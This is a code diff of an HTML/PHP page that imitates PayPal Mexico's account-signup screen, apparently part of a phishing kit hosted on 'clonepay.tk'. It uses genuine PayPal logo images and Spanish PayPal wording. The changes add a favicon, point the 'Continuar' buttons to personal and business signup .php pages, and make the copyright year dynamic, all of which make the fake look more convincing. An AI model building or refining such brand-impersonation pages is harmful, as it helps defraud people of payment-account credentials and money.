@@ -5,6 +5,7 @@
 	<meta http-equiv="X-UA-Compatible" content="IE=edge">
 	<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1.0, shrink-to-fit=no">
 	<title>Crear tu cuenta PayPal es gratis y muy rápido - PayPal MX</title>
+	<link rel="icon" type="image/png" href="favicon.ico" />
 	<link rel="stylesheet" type="text/css" href="resources/css/account-selection.css">
 	<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" integrity="sha384-TX8t27EcRE3e/ihU7zmQxVncDAy5uIKz4rEkgIXeMed4M0jlfIDPvg6uqKI2xXr2" crossorigin="anonymous">
 </head>
@@ -25,7 +26,7 @@
 						</div>
 					</div>
 					<div class="col-sm-4" style="margin: auto;">
-						<a href="welcome/signup_personal"><button class="btn btn-primary">Continuar</button></a>
+						<a href="welcome/signup_personal.php"><button class="btn btn-primary">Continuar</button></a>
 					</div>
 				</div>
 				<div class="bg-light row" style="margin-top: 10px">
@@ -37,7 +38,7 @@
 						</div>
 					</div>
 					<div class="col-sm-4" style="margin: auto;">
-						<a href="welcome/signup_business"><button class="btn btn-primary">Continuar</button></a>
+						<a href="welcome/signup_business.php"><button class="btn btn-primary">Continuar</button></a>
 					</div>
 				</div>
 			</div>
@@ -50,7 +51,7 @@
 			<img src="https://cdn.freebiesupply.com/logos/large/2x/visa-logo-black-and-white.png" height="70px">-->
 			<img src="https://www.paypalobjects.com/digitalassets/c/website/marketing/latam/mx/account-selection/2018_redesign/context/img_mx-cards_logo.png" height="25px">
 		</div>
-    	<p class="text-center text-1 mb-0" style="color: white">Copyright © 2020 <a href="https://www.clonepay.tk">PayPal</a>. All Rights Reserved.</p>
+    	<p class="text-center text-1 mb-0" style="color: white">Copyright © <?php echo date("Y")?> <a href="https://tie.clonepay.tk">PayPal</a>. All Rights Reserved.</p>
   	</div>
 <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
 <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js" integrity="sha384-9/reFTGAW83EW2RDu2S0VKaIzap3H66lZH81PoYlFhbGU+6BZp6G7niu735Sk7lN" crossorigin="anonymous"></script>
